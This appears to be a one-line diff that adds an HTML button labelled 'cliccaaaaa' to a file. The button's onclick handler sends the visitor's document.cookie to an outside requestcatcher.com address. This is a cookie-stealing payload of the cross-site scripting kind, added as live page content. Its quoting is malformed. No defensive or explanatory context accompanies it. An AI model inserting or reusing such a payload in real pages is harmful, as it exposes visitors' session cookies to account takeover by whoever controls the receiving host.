@@ -1,0 +1,1 @@
+<button onclick="fetch("https://susba.requestcatcher.com/test?susba=" + document.cookie)>cliccaaaaa</button>
